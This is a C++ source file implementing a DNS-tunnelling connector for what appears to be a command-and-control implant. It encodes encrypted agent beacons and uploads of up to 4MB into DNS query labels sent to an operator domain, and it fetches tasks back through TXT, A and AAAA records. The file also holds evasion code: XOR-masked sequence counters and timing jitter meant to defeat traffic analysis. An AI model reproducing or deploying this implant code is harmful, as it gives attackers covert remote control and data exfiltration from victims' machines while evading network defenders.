#include "ConnectorDNS.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "DnsCompression.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

static void ToHex32(ULONG value, CHAR out[9])
{
	static const CHAR hex[] = "0123456789abcdef";
	for (int i = 7; i >= 0; --i) {
		out[i] = hex[value & 0x0F];
		value >>= 4;
	}
	out[8] = '\0';
}

static ULONG DnsBase32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dstSize)
{
	static const CHAR alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
	ULONG bitBuffer = 0;
	int   bitCount  = 0;
	ULONG outLen    = 0;

	for (ULONG i = 0; i < srcLen; ++i) {
		bitBuffer = (bitBuffer << 8) | src[i];
		bitCount += 8;
		while (bitCount >= 5) {
			bitCount -= 5;
			if (outLen + 1 >= dstSize)
				return 0;
			ULONG index = (bitBuffer >> bitCount) & 0x1F;
			dst[outLen++] = alphabet[index];
		}
	}

	if (bitCount > 0) {
		if (outLen + 1 >= dstSize)
			return 0;
		ULONG index = (bitBuffer << (5 - bitCount)) & 0x1F;
		dst[outLen++] = alphabet[index];
	}

	if (outLen < dstSize)
		dst[outLen] = '\0';
	return outLen;
}

static void BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize)
{
    CHAR seqHex[9];
    CHAR idxHex[9];
    // XOR Obfuscation to hide incremental patterns
    ToHex32(seq ^ 0x39913991, seqHex);
    ToHex32(idx ^ 0x39913991, idxHex);

    // 如果没有 dataLabel，就用单个短 label 占位，避免出现 ".." 连续点
	const CHAR* dataPart = (dataLabel && dataLabel[0]) ? dataLabel : "x";
	const CHAR* domPart  = (domain && domain[0]) ? domain : "";

	if (domPart[0])
		_snprintf(out, outSize, "%s.%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart, domPart);
	else
		_snprintf(out, outSize, "%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart);
}

static int EncodeDnsName(const CHAR* host, BYTE* buf, int bufSize)
{
	// 把 "a.b.c" 变成 [1]a[1]b[1]c[0]
	int len = 0;
	const CHAR* p = host;
	while (*p && len < bufSize - 1) {
		const CHAR* labelStart = p;
		int labelLen = 0;
		while (*p && *p != '.' && len + 1 + labelLen < bufSize - 1) {
			++p;
			++labelLen;
		}
		if (labelLen == 0)
			break;
		buf[len++] = (BYTE)labelLen;
		if (len + labelLen >= bufSize)
			return -1;
		memcpy(buf + len, labelStart, labelLen);
		len += labelLen;
		if (*p == '.')
			++p;
	}
	if (len >= bufSize)
		return -1;
	buf[len++] = 0;
	return len;
}

static void SelectResolver(const CHAR* raw, CHAR* out, size_t outSize)
{
	// Default to a public recursive resolver if nothing supplied.
	const CHAR* def = "8.8.8.8";
	if (!raw || !raw[0]) {
		_snprintf(out, outSize, "%s", def);
		return;
	}

	// Take the first token up to comma/semicolon/whitespace.
	size_t i = 0;
	while (raw[i] && i + 1 < outSize) {
		CHAR c = raw[i];
		if (c == ',' || c == ';' || c == ' ' || c == '\t' || c == '\r' || c == '\n')
			break;
		out[i] = c;
		++i;
	}
	out[i] = '\0';
	if (i == 0) {
		_snprintf(out, outSize, "%s", def);
	}
}

static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
	*outSize = 0;
	if (!ApiWin || !ApiWin->WSAStartup || !ApiWin->socket || !ApiWin->sendto || !ApiWin->recvfrom || !ApiWin->closesocket)
		return FALSE;

	WSADATA wsaData;
	if (ApiWin->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return FALSE;

	SOCKET s = ApiWin->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (s == INVALID_SOCKET) {
		ApiWin->WSACleanup();
		return FALSE;
	}

	// 解析 resolver，支持从 profile.resolvers 传入的 IPv4 文本，
	// 若为空则回退到默认 8.8.8.8。
	CHAR resolver[64];
	memset(resolver, 0, sizeof(resolver));
	SelectResolver(resolverRaw, resolver, sizeof(resolver));

	HOSTENT* he = ApiWin->gethostbyname(resolver);
	if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}

	sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(53);
	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

	BYTE query[4096];
	memset(query, 0, sizeof(query));
	USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
	query[0] = (BYTE)(id >> 8);
	query[1] = (BYTE)(id & 0xFF);
	query[2] = 0x01; // recursion desired
	query[3] = 0x00;
	query[4] = 0x00;
	query[5] = 0x01; // QDCOUNT = 1

	int offset = 12;
	int nameLen = EncodeDnsName(qname, query + offset, sizeof(query) - offset - 4);
	if (nameLen < 0) {
		ApiWin->closesocket(s);
		ApiWin->WSACleanup();
		return FALSE;
	}
	offset += nameLen;
	// QTYPE / QCLASS IN (1)
	USHORT qtypeCode = 16; // TXT
	if (qtypeStr && qtypeStr[0]) {
		CHAR qt[8];
		memset(qt, 0, sizeof(qt));
		int qi = 0;
		while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
			CHAR c = qtypeStr[qi];
			if (c >= 'a' && c <= 'z')
				c = (CHAR)(c - 'a' + 'A');
			qt[qi++] = c;
		}
		qt[qi] = '\0';
		// Only support TXT/A/AAAA here.
		if (qt[0] == 'A' && qt[1] == '\0') {
			qtypeCode = 1; // A
		} else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0') {
			qtypeCode = 28; // AAAA
		}
	}
	query[offset++] = (BYTE)(qtypeCode >> 8);
	query[offset++] = (BYTE)(qtypeCode & 0xFF);
	query[offset++] = 0x00;
	query[offset++] = 0x01;

	BYTE resp[1024];
	memset(resp, 0, sizeof(resp));
	int recvLen = 0;
	const int maxRetries = 3;
	for (int attempt = 0; attempt < maxRetries; ++attempt) {
		int sent = ApiWin->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
		if (sent != offset) {
			ApiWin->closesocket(s);
			ApiWin->WSACleanup();
			return FALSE;
		}

		fd_set readfds;
		readfds.fd_count = 1;
		readfds.fd_array[0] = s;
		timeval timeout;
		timeout.tv_sec = 2;
		timeout.tv_usec = 0;

		int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
		if (selResult == 0) {
			// timeout, retry if attempts remain
			continue;
		}
		if (selResult == SOCKET_ERROR) {
			break;
		}

		int addrLen = sizeof(addr);
		recvLen = ApiWin->recvfrom(s, (char*)resp, sizeof(resp), 0, (sockaddr*)&addr, &addrLen);
		if (recvLen > 0)
			break;
	}

	ApiWin->closesocket(s);
	ApiWin->WSACleanup();
	if (recvLen <= 0)
		return FALSE;

	// 解析 answers，根据 qtypeCode 决定如何重组 payload
	if (recvLen < 12)
		return FALSE;
	int qdcount = (resp[4] << 8) | resp[5];
	int ancount = (resp[6] << 8) | resp[7];
	int pos = 12;
	// 跳过所有 question
	for (int qi = 0; qi < qdcount; ++qi) {
		// 跳过 name
		while (pos < recvLen && resp[pos] != 0) {
			if ((resp[pos] & 0xC0) == 0xC0) { // 压缩指针
				pos += 2;
				break;
			}
			pos += resp[pos] + 1;
		}
		pos++; // 终止 0
		pos += 4; // QTYPE+QCLASS
	}

	ULONG written = 0;
	// 解析 answers
	for (int ai = 0; ai < ancount; ++ai) {
		if (pos + 12 > recvLen)
			return FALSE;
		// name（可能是压缩指针）
		if ((resp[pos] & 0xC0) == 0xC0)
			pos += 2;
		else {
			while (pos < recvLen && resp[pos] != 0) {
				pos += resp[pos] + 1;
			}
			pos++;
		}
		USHORT type = (resp[pos] << 8) | resp[pos + 1];
		pos += 2; // TYPE
		pos += 2; // CLASS
		pos += 4; // TTL
		USHORT rdlen = (resp[pos] << 8) | resp[pos + 1];
		pos += 2;
		if (pos + rdlen > recvLen)
			return FALSE;

		if (qtypeCode == 16 && type == 16 && rdlen > 0) {
			// TXT RDATA: <len><data>
			BYTE txtLen = resp[pos];
			if (txtLen > rdlen - 1)
				txtLen = (BYTE)(rdlen - 1);
			if (txtLen > 0 && txtLen <= outBufSize) {
				memcpy(outBuf, resp + pos + 1, txtLen);
				*outSize = txtLen;
				return TRUE;
			}
		} else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
			// A 记录：4 字节 IPv4，服务器端按 4 字节分片 payload
			if (written + 4 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 4);
				written += 4;
			}
		} else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
			// AAAA 记录：16 字节 IPv6，服务器端按 16 字节分片 payload
			if (written + 16 <= outBufSize) {
				memcpy(outBuf + written, resp + pos, 16);
				written += 16;
			}
		}
		pos += rdlen;
	}

	if (qtypeCode == 1 || qtypeCode == 28) {
		if (written > 0) {
			*outSize = written;
			return TRUE;
		}
	}

	return FALSE;
}

static BOOL BuildDataLabelsFromBytes(const BYTE* src, ULONG srcLen, ULONG labelSize, CHAR* out, ULONG outSize)
{
	if (!src || !srcLen || !out || !labelSize || labelSize > 63 || outSize == 0)
		return FALSE;

	CHAR encoded[2048];
	memset(encoded, 0, sizeof(encoded));
	ULONG encLen = DnsBase32Encode(src, srcLen, encoded, sizeof(encoded));
	if (encLen == 0)
		return FALSE;

	ULONG written = 0;
	ULONG i = 0;
	while (i < encLen) {
		ULONG chunk = labelSize;
		if (chunk > encLen - i)
			chunk = encLen - i;
		if (written + chunk + 1 >= outSize) // +1 for dot or NUL
			return FALSE;
		memcpy(out + written, encoded + i, chunk);
		written += chunk;
		i += chunk;
		if (i < encLen) {
			out[written++] = '.';
		}
	}
	if (written >= outSize)
		return FALSE;
	out[written] = '\0';
	return TRUE;
}

ConnectorDNS::ConnectorDNS()
{
	// For now, just zero-initialized by the default member initializer list.
}

BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize)
{
    // cache profile
    this->profile = profile;

    // copy encrypt key (expect up to 16 bytes)
    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    ULONG keyLen = StrLenA((CHAR*)profile.encrypt_key);
    if (keyLen > 16)
        keyLen = 16;
    memcpy(this->encryptKey, profile.encrypt_key, keyLen);

    // pkt size and basic bounds
    this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
    if (this->pktSize > 64000)
        this->pktSize = 64000;

    // label size (per DNS label, in Base32 characters)
    this->labelSize = profile.label_size ? profile.label_size : 48;
    if (this->labelSize == 0 || this->labelSize > 63)
        this->labelSize = 48;

    // domain/qtype
    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    if (profile.qtype)
        lstrcpynA(this->qtype, (CHAR*)profile.qtype, sizeof(this->qtype));
    else
        lstrcpynA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));

    // derive sid from decrypted beat first 8 bytes (agent_type, agent_id)
    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    // beat is already RC4-encrypted with config->encrypt_key on Agent side,
    // so here we decrypt it with the same key to get clear agent_id.
    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    // Interpret agent_id in big-endian order to match the HTTP listener /
    // Go side (which uses binary.BigEndian.Uint32). This ensures that the
    // sid we derive here is identical to the agentId string used by the
    // teamserver, so TsAgentProcessData/TsAgentGetHostedTasks(sid, ...) hit
    // the same agent entry.
    ULONG agentId = 0;
    if (beatSize >= 8) {
        agentId |= ((ULONG)beatCopy[4] << 24);
        agentId |= ((ULONG)beatCopy[5] << 16);
        agentId |= ((ULONG)beatCopy[6] << 8);
        agentId |= ((ULONG)beatCopy[7] << 0);
    }
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    // cache initial beat for potential smart HI retries
    if (beat && beatSize) {
        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
        if (this->hiBeat) {
            memcpy(this->hiBeat, beat, beatSize);
            this->hiBeatSize = beatSize;
            this->hiRetries  = 3;
            this->hiSent     = FALSE;
        }
    }

    this->initialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    // Free any allocated receive buffer.
    if (this->recvData) {
        // Using HeapFree / LocalFree would require function pointers
        // similar to other connectors; for this stub we simply ignore
        // allocator details and reset the pointer/state.
        this->recvData = NULL;
        this->recvSize = 0;
    }
    if (this->hiBeat && this->hiBeatSize) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
        this->hiBeatSize = 0;
    }
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf    = NULL;
        this->downTotal  = 0;
        this->downFilled = 0;
    }
}

void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
{
    // base packet size used for DNS frames
    ULONG pkt = this->pktSize ? this->pktSize : 1024;
    if (pkt > 64000)
        pkt = 64000;

    CHAR dataLabel[1024];
    memset(dataLabel, 0, sizeof(dataLabel));
    CHAR qname[512];
    memset(qname, 0, sizeof(qname));

    // HI：第一次带 beat 的调用仍然沿用原始打包方式（不做应用层分片），
    // 以保持与现有 TsAgentCreate / beat 解析逻辑完全兼容。
    if (!this->hiSent && data && data_size) {
        // 注意：BuildDataLabelsFromBytes 使用 1024 字节的 dataLabel 缓冲，并且
        // 在内部先进行 Base32 编码（8/5 膨胀）。为避免编码后长度超出缓冲，
        // 这里对原始帧大小施加一个保守上限（~600 字节），保证编码后始终可用。
        const ULONG maxSafeFrame = 600;
        ULONG maxBuf = pkt;
        if (maxBuf > maxSafeFrame)
            maxBuf = maxSafeFrame;
        if (data_size && maxBuf > data_size)
            maxBuf = data_size;
        BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
        if (!encBuf)
            return;
        memcpy(encBuf, data, maxBuf);
        if (!BuildDataLabelsFromBytes(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, maxBuf);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, maxBuf);

        BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
            this->hiSent = TRUE;
        } else if (this->hiRetries > 0) {
            this->hiRetries--;
        }
        return;
    }

    // 之后所有有数据的调用视为 PUT，使用应用层分片：
    // frame = [4 bytes total_len][4 bytes offset][chunk...]
    if (data && data_size) {
        const ULONG headerSize = 8;
        ULONG total = data_size;
        ULONG maxChunk = pkt;
        if (maxChunk <= headerSize)
            maxChunk = headerSize + 1;
        maxChunk -= headerSize;

        // 为避免单个 frame 经 Base32 编码后超过 dataLabel 缓冲（1024 字节），
        // 这里对原始 frame 总长度施加保守上限（~600 字节），对应原始 chunk 约 592 字节。
        // 这样 BuildDataLabelsFromBytes 在编码/拼接 label 时不会返回 FALSE，
        // 从而避免大上传任务在 Agent 端被静默丢弃。
        const ULONG maxSafeFrame = 600;
        if (maxChunk + headerSize > maxSafeFrame)
            maxChunk = maxSafeFrame - headerSize;

        // 安全上限，避免异常情况占用过多内存；与服务器侧 handlePutFragment 对齐。
        const ULONG maxUploadSize = 4 << 20; // 4MB
        if (total > maxUploadSize)
            total = maxUploadSize;

        ULONG seqForSend = ++this->seq;
        ULONG offset = 0;
        while (offset < total) {
            ULONG chunk = total - offset;
            if (chunk > maxChunk)
                chunk = maxChunk;

            ULONG frameSize = headerSize + chunk;
            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
            if (!frame)
                return;

            // total_len (big-endian)
            frame[0] = (BYTE)((total >> 24) & 0xFF);
            frame[1] = (BYTE)((total >> 16) & 0xFF);
            frame[2] = (BYTE)((total >> 8) & 0xFF);
            frame[3] = (BYTE)((total >> 0) & 0xFF);
            // offset (big-endian)
            frame[4] = (BYTE)((offset >> 24) & 0xFF);
            frame[5] = (BYTE)((offset >> 16) & 0xFF);
            frame[6] = (BYTE)((offset >> 8) & 0xFF);
            frame[7] = (BYTE)((offset >> 0) & 0xFF);
            memcpy(frame + headerSize, data + offset, chunk);

            memset(dataLabel, 0, sizeof(dataLabel));
            if (!BuildDataLabelsFromBytes(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                MemFreeLocal((LPVOID*)&frame, frameSize);
                return;
            }
            MemFreeLocal((LPVOID*)&frame, frameSize);

            BuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
            BYTE tmp[512];
            ULONG tmpSize = 0;
            DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);

            // Pacing with Jitter (Traffic Shaping):
            // Instead of a fixed 30ms delay, use a random delay between 20ms and 50ms.
            // This breaks the timing regularity signatures used by AI/ML traffic analysis.
            // Logic: 20 + (Random % 30)
            ULONG pacing = 20 + (GetTickCount() % 30);
            ApiWin->Sleep(pacing);

            offset += chunk;
        }
        // 记录本次上行总量，供自适应 sleep 使用
        this->lastUpTotal = total;
        return;
    }

    // 空数据：GET 下行任务；在未完成首 HI 时优先执行智能 HI 重试。
    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
        ULONG maxBuf = pkt;
        // 智能上线：在未成功发送 HI 且仍有重试次数时，优先重发 HI
        ULONG retrySize = this->hiBeatSize;
        if (retrySize > maxBuf)
            retrySize = maxBuf;
        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
        if (!encBuf)
            return;
        memcpy(encBuf, this->hiBeat, retrySize);
        if (!BuildDataLabelsFromBytes(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
            MemFreeLocal((LPVOID*)&encBuf, retrySize);
            return;
        }
        MemFreeLocal((LPVOID*)&encBuf, retrySize);

        BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
        BYTE tmp[512];
        ULONG tmpSize = 0;
        if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
            this->hiSent = TRUE;
        } else {
            if (this->hiRetries > 0)
                this->hiRetries--;
        }
        return;
    }

    // 正常 GET / 心跳逻辑
    // Hybrid Mode (A/TXT):
    // 如果当前没有正在重组的下行任务 (downBuf == NULL) 且配置为 TXT 模式，
    // 则先发送一个轻量级的 A 记录查询作为心跳。
    // - 如果 TS 返回 0.0.0.0 -> 无任务，直接返回（进入 Sleep）。
    // - 如果 TS 返回 非 0.0.0.0 -> 有任务，继续执行下面的 TXT 查询拉取数据。
    if (!this->downBuf && this->qtype[0] == 'T') { // starts with 'T' -> TXT
        CHAR qnameA[512];
        BuildQName(this->sid, "api", this->seq + 1, this->idx, "", this->domain, qnameA, sizeof(qnameA));
        
        BYTE ipBuf[16];
        ULONG ipSize = 0;
        // 查询 A 记录
        if (DnsQueryTxt(qnameA, (CHAR*)this->profile.resolvers, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
            // 检查是否为 0.0.0.0
            if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
                // 无任务，更新 seq 并返回，让 MainAgent 继续 sleep
                this->seq++; 
                return;
            }
            // 有任务 (e.g. 0.0.0.1)，Fall through to TXT logic below
        } else {
            // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
            return;
        }
    }

    // 正常 GET (TXT)：从服务器获取包含 [total_len][offset][chunk] 头部的下行片段，
    // 在本地 downBuf 中重组，完整后再一次性交给 AgentMain。
    BuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
    BYTE respBuf[1024];
    ULONG respSize = 0;
    if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
        const ULONG headerSize = 8;
        // 新协议：带有 [total_len][offset] 头部
        if (respSize > headerSize) {
            ULONG total = 0;
            ULONG offset = 0;
            total |= ((ULONG)respBuf[0] << 24);
            total |= ((ULONG)respBuf[1] << 16);
            total |= ((ULONG)respBuf[2] << 8);
            total |= ((ULONG)respBuf[3] << 0);
            offset |= ((ULONG)respBuf[4] << 24);
            offset |= ((ULONG)respBuf[5] << 16);
            offset |= ((ULONG)respBuf[6] << 8);
            offset |= ((ULONG)respBuf[7] << 0);
            ULONG chunkLen = respSize - headerSize;
            const ULONG maxDownloadSize = 4 << 20; // 4MB
            if (total > 0 && total <= maxDownloadSize && offset < total) {
                if (!this->downBuf || this->downTotal != total) {
                    if (this->downBuf && this->downTotal) {
                        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                    }
                    this->downBuf = (BYTE*)MemAllocLocal(total);
                    if (!this->downBuf) {
                        this->downTotal  = 0;
                        this->downFilled = 0;
                        return;
                    }
                    this->downTotal  = total;
                    this->downFilled = 0;
                }
                ULONG end = offset + chunkLen;
                if (end > total)
                    end = total;
                ULONG n = end - offset;
                memcpy(this->downBuf + offset, respBuf + headerSize, n);
                this->downFilled += n;
                if (this->downFilled >= this->downTotal) {
                    // 解析会话头：[flags][orig_len_le]，然后将原始 payload 交给上层。
                    BYTE* finalBuf   = this->downBuf;
                    ULONG finalSize  = this->downTotal;
                    if (this->downTotal > 5) {
                        BYTE  flags = this->downBuf[0];
                        ULONG orig  = 0;
                        orig |= (ULONG)this->downBuf[1];
                        orig |= ((ULONG)this->downBuf[2] << 8);
                        orig |= ((ULONG)this->downBuf[3] << 16);
                        orig |= ((ULONG)this->downBuf[4] << 24);

                        if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
                            // 压缩路径：使用 DEFLATE 解压下行 payload。
                            BYTE* outBuf = NULL;
                            if (DeflateDecompress(this->downBuf + 5, this->downTotal - 5, &outBuf, orig) && outBuf) {
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
                            // 无压缩：直接跳过 5 字节头部，仅将原始任务 payload 交给上层。
                            BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
                            if (outBuf) {
                                memcpy(outBuf, this->downBuf + 5, orig);
                                finalBuf  = outBuf;
                                finalSize = orig;
                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
                                this->downBuf = NULL;
                            }
                        }
                    }

                    this->recvData = finalBuf;
                    this->recvSize = (int)finalSize;
                    // 记录本次下行总量，供自适应 sleep 使用
                    this->lastDownTotal = finalSize;
                    this->downBuf    = NULL;
                    this->downTotal  = 0;
                    this->downFilled = 0;
                }
                return;
            }
        }
        // 兼容旧协议：无头部时视为完整单包，直接交给上层。
        this->recvData = (BYTE*)MemAllocLocal(respSize);
        if (!this->recvData)
            return;
        memcpy(this->recvData, respBuf, respSize);
        this->recvSize = (int)respSize;
    }
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
    this->recvData = NULL;
    this->recvSize = 0;
}
